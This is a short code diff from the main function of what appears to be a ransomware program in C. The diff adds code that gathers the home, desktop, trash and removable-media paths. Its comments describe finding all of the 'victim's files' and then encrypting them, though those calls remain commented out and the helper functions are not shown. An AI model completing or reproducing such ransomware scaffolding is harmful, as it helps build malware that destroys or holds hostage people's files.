@@ -7,21 +7,25 @@
 #include"lib/struct.h"
 
 
-
 int main(){
+    
+    /* Linked list structures */
     List *files = NULL;
     List *encrypted = NULL;
     List *not_encrypted = NULL;
-    char* start_path = get_start_path();
-    char *trash = get_trash_path(start_path);
+    
+    /* Path variables */
+    char * home = get_home_enviroment();
+    char * desktop = get_desktop_enviroment(home);
+    char * username = get_username();
+    char *trash = get_trash_path(home);
+    char *media = get_media_path(username);
 
-    //char *start_path = "/home/tarcisio/Desktop/testes/";
-
-    printf("%s %s\n",start_path, trash );
     // finding all victim's files
     //find_files(&files, start_path);
     //find_files(&files, trash);
-
+    //find_files(&files, media);
+    
     // start encryption
     //encrypt_files(files, &encrypted, &not_encrypted);
     //print(encrypted);
@@ -34,3 +38,4 @@ int main(){
 
     return 0;
 }
+
